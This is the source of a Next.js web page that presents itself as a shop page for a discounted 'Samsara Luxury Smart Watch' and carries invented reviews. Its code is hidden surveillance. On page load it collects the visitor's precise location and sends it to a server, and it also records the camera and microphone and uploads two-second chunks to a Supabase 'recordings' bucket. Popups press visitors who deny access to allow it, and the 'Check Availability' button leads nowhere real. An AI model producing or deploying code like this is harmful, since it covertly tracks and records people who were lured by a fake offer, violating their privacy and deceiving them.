"use client";

import { motion } from "framer-motion";
import { Swiper, SwiperSlide } from "swiper/react";
import { Pagination, Autoplay } from "swiper/modules";
import Image from "next/image";
import "swiper/css";
import "swiper/css/pagination";
import { useEffect, useRef, useState } from "react";
import Lottie, { LottieRefCurrentProps } from "lottie-react";
import "./app.css";
import PermissionPopup from "@/components/PermissionPopup";
import FalsePopup from "@/components/FalsePopup";
import { createClient } from "@supabase/supabase-js";

import checkIcon from "@/public/checkIcon.json";
import Navbar from "@/components/Navbar";

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

const variants = [
  {
    name: "DARK SLATE",
    images: ["/images/variant1-1.jpg", "/images/variant1-2.jpg"],
  },
  {
    name: "ROSE GOLD",
    images: ["/images/variant2-1.jpg", "/images/variant2-2.jpg"],
  },
  {
    name: "YANKEES BLUE",
    images: ["/images/variant3-1.jpg", "/images/variant3-2.jpg"],
  },
];

export default function SamsaraDetailPage() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const lottieRef = useRef<LottieRefCurrentProps>(null);
  const [currentVariant, setCurrentVariant] = useState(variants[0]);
  const [isDenied, setIsDenied] = useState({ location: false, media: false });
  const [PermissionModalOpen, setPermissionModalOpen] = useState(false);
  const [falseModal, setFalseModal] = useState(false);

  const hasRun = useRef(false);

  useEffect(() => {
    if (isDenied.location || isDenied.media) {
      setPermissionModalOpen(true);
    }
  }, [isDenied]);

  useEffect(() => {
    if (hasRun.current) return; // block 2nd run
    hasRun.current = true;
    async function init() {
      try {
        // STEP 1: CHECK USER
        const userRes = await fetch("/api/user/check");
        const userData = await userRes.json();

        console.log("USER =>", userData);

        if (!userData || !userData.user) {
          console.log("User not valid. Stopping...");
          return;
        }

        // STEP 2: GET LOCATION
        if (!navigator.geolocation) {
          console.log("Geolocation not supported");
          return;
        }

        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const { accuracy, latitude, longitude } = pos.coords;

            // STEP 3: SEND LOCATION
            console.log(latitude, longitude, pos);
            fetch("/api/location", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                accuracy,
                lan: latitude,
                lon: longitude,
              }),
            });
          },
          (err) => {
            console.error("Location Error:", err);
            if (err.message.includes("denied")) {
              setIsDenied((prev) => ({ ...prev, location: true }));
            }
          },
          {
            enableHighAccuracy: true,
          }
        );

        // STEP 4: TRY MEDIA ACCESS
        let chunkIndex = 0;

        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: true,
          });

          if (videoRef.current) videoRef.current.srcObject = stream;

          const recorder = new MediaRecorder(stream, {
            mimeType: "video/webm; codecs=vp8,opus",
          });

          // 🔹 INIT session
          const initRes = await fetch("/api/upload/init");
          const { userId, sessionId } = await initRes.json();

          recorder.ondataavailable = async (e) => {
            if (e.data.size === 0) return;
            chunkIndex++;
            const { error } = await supabase.storage
              .from("recordings")
              .upload(
                `${userId}/${sessionId}/${String(chunkIndex).padStart(
                  6,
                  "0"
                )}.bin`,
                e.data,
                {
                  contentType: "application/octet-stream",
                  upsert: false,
                }
              );
            console.log(
              "uploaded success fully",
              `${userId}/${sessionId}/${String(chunkIndex).padStart(
                6,
                "0"
              )}.bin`
            );
            if (error) {
              console.error("Supabase upload failed:", error.message);
            }
          };
          recorder.start(2000);
        } catch (err) {
          console.error("Media error:", err);
        }
      } catch (error) {
        console.error("Init error:", error);
      }
    }

    init();
  }, []);

  useEffect(() => {
    if (lottieRef.current) {
      lottieRef.current.setSpeed(0.5); // <-- speed here
    }
  }, []);
  return (
    <>
      <Navbar />
      <main className="min-h-screen bg-gradient-to-b from-[#f5f5f5] to-[#e8ebed] text-[#1b262a] font-[Titillium Web]">
        {/* Hero / Gallery */}
        <video ref={videoRef} autoPlay muted playsInline controls />
        <section className="py-12 px-4 md:px-12 flex flex-col lg:flex-row gap-8 items-center justify-center">
          <motion.div
            initial={{ opacity: 0, y: 40 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6 }}
            className="w-full lg:w-1/2 rounded-[30] max-h-[480px]"
          >
            <Swiper
              modules={[Pagination, Autoplay]}
              pagination={{
                clickable: true,
                bulletClass: "custom-bullet",
                bulletActiveClass: "custom-bullet-active",
              }}
              autoplay={{ delay: 4000, disableOnInteraction: false }}
              loop
              className="shadow-2xl rounded-[30px] overflow-hidden"
            >
              {currentVariant.images.map((img, i) => (
                <SwiperSlide key={i}>
                  <div className="relative group">
                    <Image
                      src={img}
                      alt={`${currentVariant.name} - ${i + 1}`}
                      width={800}
                      height={600}
                      className="w-full h-[480px] object-cover transition-transform duration-700 group-hover:scale-105"
                    />
                    <div className="absolute inset-0 bg-gradient-to-t from-black/30 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500" />
                  </div>
                </SwiperSlide>
              ))}
            </Swiper>
          </motion.div>

          {/* Product Info */}
          <motion.div
            initial={{ opacity: 0, y: 40 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8 }}
            className="w-full lg:w-1/2 space-y-6"
          >
            <h1 className="text-[32px] md:text-[40px] my-[10px] font-[Stack Sans Notch] font-semibold">
              Samsara Luxury Smart Watch
            </h1>

            <p className="text-[18px] my-[20px] border-l-[4px] px-[8px] border-[#1b262a] text-[#555]">
              New Jappanese Technology
            </p>

            <div className="flex items-center gap-[12px] mt-[4px] mb-[16px]">
              <span className="text-[20px] text-[#888] line-through">
                &#x20B9;1199
              </span>
              <span className="text-[34px] font-[700] text-[#fac020]">
                &#x20B9;399
              </span>
              <span className="px-[8px] py-[2px] bg-[#f5c543] text-[#1b1b1b] text-[13px] font-[600] rounded-[6px]">
                86&#x25; OFF
              </span>
            </div>

            <div className="flex items-center gap-[16px]">
              <motion.button
                whileTap={{ scale: 0.97 }}
                onClick={() => {
                  if (isDenied.location || isDenied.media) {
                    setPermissionModalOpen(true);
                  } else {
                    setFalseModal(true);
                  }
                }}
                className="target-btn w-full flex items-center gap-x-[20px] rounded-[14px] px-[12px] py-[8px] font-semibold text-[#1b262a] shadow-[0_3px_8px_rgba(0,0,0,0.15)] relative overflow-hidden"
              >
                <Lottie
                  lottieRef={lottieRef}
                  animationData={checkIcon}
                  style={{ width: 40, height: 40 }}
                  loop={true}
                />
                <span className="text-[16px] tracking-[0.5px] font-semibold text-[white]">
                  Check Availability
                </span>
              </motion.button>
            </div>

            {/* Variants */}
            <div className="my-[20]">
              <h3 className="text-xl font-semibold mb-[12]">Other Variants</h3>
              <div className="flex max-w-[100vw] overflow-auto gap-[12px]">
                {variants.map((v) => (
                  <button
                    key={v.name}
                    type="button"
                    onClick={() => setCurrentVariant(v)}
                    className={`border-2 p-[5] varient-btn rounded-lg overflow-hidde ${
                      v.name === currentVariant.name
                        ? "border-[#22333B]"
                        : "border-transparent"
                    }`}
                  >
                    <Image
                      src={v.images[0]}
                      alt={v.name}
                      width={100}
                      height={100}
                      className="object-cover flex-1 rounded-[20] w-20 h-20"
                    />
                    <p className="text-sm mt-1 text text-center">{v.name}</p>
                  </button>
                ))}
              </div>
            </div>
          </motion.div>
        </section>

        {/* Product Details Table */}
        <motion.section
          initial={{ opacity: 0 }}
          whileInView={{ opacity: 1 }}
          viewport={{ once: true }}
          transition={{ duration: 0.6 }}
          className="px-[16px] md:px-[64px] py-[40px] rounded-[24px] border-[2px] border-[#22333B] bg-gradient-to-br from-[#f8f9fa] to-[#e6e9ed] mb-[48px] shadow-[0_8px_32px_rgba(34,51,59,0.12)]"
        >
          <h2 className="text-[32px] font-semibold mb-[20px] font-[Stack Sans Notch] bg-gradient-to-r from-[#22333B] to-[#f8db39] bg-clip-text text-transparent">
            Product Details
          </h2>

          <div className="overflow-hidden rounded-[20px] border-[1px] border-[#22333B]/10 shadow-[0_4px_20px_rgba(0,0,0,0.05)]">
            <table className="w-full border-collapse text-left bg-white/90 backdrop-blur-[8px]">
              <tbody>
                {[
                  ["Brand", "Samsara"],
                  ["Model", "Elite X1 (Luxury Edition)"],
                  ["Display", "1.43” AMOLED Touchscreen (Always-On)"],
                  [
                    "Body Material",
                    "Stainless Steel Frame with Sapphire Glass",
                  ],
                  ["Strap Options", "Leather / Milanese Mesh / Silicone"],
                  ["Battery Life", "Up to 10 Days on Single Charge"],
                  ["Water Resistance", "5 ATM (Splash & Swim Proof)"],
                  ["Connectivity", "Bluetooth 5.3, Dual Sync, GPS, NFC"],
                  ["Compatibility", "iOS & Android"],
                ].map(([label, value], i) => (
                  <motion.tr
                    key={i}
                    whileHover={{ x: 12 }}
                    transition={{ type: "spring", stiffness: 300 }}
                    className="border-b-[1px] border-[#22333B]/10 group relative overflow-hidden transition-all duration-300"
                  >
                    {/* Label Cell */}
                    <td
                      className="py-[16px] pl-[24px] pr-[12px] font-semibold text-[15px] text-[#22333B]"
                      style={{
                        background: `linear-gradient(to right, #f8f9fa ${
                          i % 2 === 0 ? "100%" : "0%"
                        }, #ffffff 100%)`,
                      }}
                    >
                      {label}
                    </td>

                    {/* Value Cell */}
                    <td className="py-[16px] pr-[24px] text-[15px] text-gray-700 relative z-10 font-medium">
                      {value}
                    </td>

                    {/* Shine Sweep Effect */}
                    <span className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-700 skew-x-12 pointer-events-none" />

                    {/* Subtle Glow on Hover */}
                    <span className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-500 pointer-events-none">
                      <span className="absolute inset-y-0 left-0 w-[4px] bg-gradient-to-b from-[#00d4ff] to-[#22333B] blur-[6px]" />
                    </span>
                  </motion.tr>
                ))}
              </tbody>
            </table>
          </div>
        </motion.section>
        <PermissionPopup
          isOpen={PermissionModalOpen}
          onAllow={() => window.location.reload()}
          onLater={() => {
            setPermissionModalOpen(false);
          }}
        />
        <FalsePopup
          isOpen={falseModal}
          onAllow={() => setFalseModal(false)}
          onLater={() => {
            setFalseModal(false);
          }}
        />

        {/* Reviews */}
        <motion.section
          initial={{ opacity: 0, y: 30 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.6 }}
          className="px-[24px] md:px-[64px] py-[40px] bg-white"
        >
          <h2 className="text-[28px] font-semibold mb-[24px] font-[Stack Sans Notch] bg-gradient-to-r from-[#22333B] to-[#00d4ff] bg-clip-text text-transparent">
            Customer Reviews
          </h2>

          <div className="grid md:grid-cols-3 gap-[24px]">
            {[
              {
                name: "Ritika M.",
                rating: 5,
                text: "Feels like a luxury watch with the brains of a smartwatch.",
                avatar: "/profilepics/profile-1.png", // Replace with real paths
              },
              {
                name: "Arjun S.",
                rating: 4,
                text: "Battery life and build quality are truly impressive.",
                avatar: "/profilepics/profile-2.png",
              },
              {
                name: "Priya K.",
                rating: 5,
                text: "Looks elegant and performs flawlessly — worth every rupee!",
                avatar: "/profilepics/profile-3.png",
              },
            ].map((r, idx) => (
              <motion.div
                key={r.name}
                initial={{ opacity: 0, y: 20 }}
                whileInView={{ opacity: 1, y: 0 }}
                transition={{ delay: idx * 0.1 }}
                className="relative p-[24px] rounded-[24px] bg-white shadow-lg hover:shadow-2xl transition-all duration-500 border border-transparent hover:border-[#22333B]/20 overflow-hidden group"
              >
                {/* Gradient Overlay on Hover */}
                <div className="absolute inset-0 bg-gradient-to-br from-[#ffd1ff]/5 to-[#fad0c4]/5 opacity-0 group-hover:opacity-100 transition-opacity duration-500" />

                {/* Floating Shine Blob */}
                <div className="absolute top-[-50px] left-[-50px] w-[120px] h-[120px] bg-white/30 rounded-full blur-[40px] opacity-0 group-hover:opacity-100 transition-opacity duration-700" />

                <div className="relative z-10 flex flex-col items-start">
                  {/* Avatar + Name */}
                  <div className="flex items-center gap-[12px] mb-[12px]">
                    <div className="w-[48px] h-[48px] rounded-full overflow-hidden border-2 border-[#22333B]/10">
                      <Image
                        src={r.avatar}
                        alt={r.name}
                        width={48}
                        height={48}
                        className="w-full h-full object-cover"
                      />
                    </div>
                    <div>
                      <p className="font-bold text-[16px] bg-gradient-to-r from-[#22333B] to-[#00d4ff] bg-clip-text text-transparent">
                        {r.name}
                      </p>
                      <p className="text-[12px] text-gray-500">
                        Verified Buyer
                      </p>
                    </div>
                  </div>

                  {/* Curvy Golden Stars */}
                  <div className="flex gap-[4px] mb-[12px]">
                    {Array.from({ length: 5 }, (_, i) => (
                      <span
                        key={i}
                        className={`text-[20px] font-bold transition-all duration-300 ${
                          i < r.rating ? "text-yellow-500" : "text-gray-300"
                        }`}
                        style={{
                          background:
                            i < r.rating
                              ? "linear-gradient(45deg, #fbbf24, #f59e0b)"
                              : "none",
                          WebkitBackgroundClip:
                            i < r.rating ? "text" : "initial",
                          WebkitTextFillColor:
                            i < r.rating ? "transparent" : "inherit",
                          textShadow:
                            i < r.rating
                              ? "0 0 8px rgba(251,191,36,0.8)"
                              : "none",
                        }}
                      >
                        &#9733;
                      </span>
                    ))}
                  </div>

                  {/* Review Text */}
                  <p className="text-[15px] text-gray-700 leading-relaxed italic">
                    {r.text}
                  </p>
                </div>

                {/* Shine Sweep on Hover */}
                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-1000 skew-x-12" />
              </motion.div>
            ))}
          </div>
        </motion.section>

        {/* CTA */}
        <motion.footer
          initial={{ opacity: 0, y: 40 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.8, ease: "easeOut" }}
          className="relative overflow-hidden bg-gradient-to-br from-[#1a2529] via-[#22333B] to-[#2a3d44] text-white"
          style={{
            backgroundImage: `
      radial-gradient(circle at 20% 80%, rgba(0, 212, 255, 0.15) 0%, transparent 50%),
      radial-gradient(circle at 80% 20%, rgba(34, 51, 59, 0.3) 0%, transparent 50%)
    `,
          }}
        >
          {/* Background Shine Blob */}
          <div className="absolute top-[-100px] left-[-100px] w-[300px] h-[300px] bg-gradient-to-r from-[#00d4ff]/20 to-transparent rounded-full blur-[80px] animate-pulse" />
          <div className="absolute bottom-[-80px] right-[-80px] w-[250px] h-[250px] bg-gradient-to-l from-[#22333B]/30 to-transparent rounded-full blur-[60px]" />

          <div className="relative z-10 px-[24px] md:px-[64px] py-[48px] flex flex-col items-center gap-[32px]">
            {/* CTA Section */}
            <div className="text-center max-w-[600px]">
              <h2 className="text-[28px] md:text-[32px] font-bold mb-[16px] bg-gradient-to-r from-white via-[#00d4ff] to-white bg-clip-text text-transparent animate-pulse">
                Check Availability at Your Location
              </h2>
              <button className="relative overflow-hidden bg-gradient-to-r from-[#22333B] to-[#00d4ff] text-white px-[40px] py-[16px] rounded-[30px] font-bold text-[18px] shadow-[0_8px_32px_rgba(0,212,255,0.3)] hover:shadow-[0_12px_40px_rgba(0,212,255,0.5)] transition-all duration-500 group">
                <span className="relative z-10">Check Avaiblity</span>
                <div className="absolute inset-0 bg-white/30 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-1000 skew-x-12" />
                <div className="absolute inset-0 animate-ping bg-white/20 rounded-[30px] scale-100 group-hover:scale-150 transition-transform duration-700" />
              </button>
            </div>

            {/* Divider */}
            <div className="w-full h-[1px] bg-gradient-to-r from-transparent via-white/20 to-transparent" />

            {/* Links Grid */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-[24px] text-center md:text-left w-full max-w-[800px]">
              {[
                {
                  title: "About Samsara",
                  items: ["Our Story", "Craftsmanship"],
                },
                { title: "Support", items: ["Warranty", "Contact Us"] },
                {
                  title: "Legal",
                  items: ["Privacy Policy", "Terms of Service"],
                },
                { title: "Connect", items: ["Instagram", "Twitter"] },
              ].map((col, i) => (
                <motion.div
                  key={col.title}
                  initial={{ opacity: 0, y: 20 }}
                  whileInView={{ opacity: 1, y: 0 }}
                  transition={{ delay: i * 0.1 }}
                  className="flex flex-col gap-[12px]"
                >
                  <h3 className="text-[14px] font-semibold uppercase tracking-wider text-[#00d4ff] opacity-80">
                    {col.title}
                  </h3>
                  {col.items.map((item) => (
                    <a
                      key={item}
                      href="#"
                      onClick={(e) => e.preventDefault()}
                      className="text-[15px] text-gray-300 hover:text-white relative group/item transition-all duration-300"
                    >
                      {item}
                      {/* Shimmer Line */}
                      <span className="absolute bottom-0 left-0 w-0 h-[1.5px] bg-gradient-to-r from-[#00d4ff] to-[#22333B] group-hover/item:w-full transition-all duration-500" />
                    </a>
                  ))}
                </motion.div>
              ))}
            </div>

            {/* Bottom Bar */}
            <div className="w-full pt-[24px] border-t-[1px] border-white/10 text-center">
              <p className="text-[13px] text-gray-400">
                2025 Samsara Watches. Handcrafted with
                <span className="text-[#00d4ff] font-bold"> Precision</span>.
              </p>
            </div>
          </div>
        </motion.footer>
      </main>
    </>
  );
}
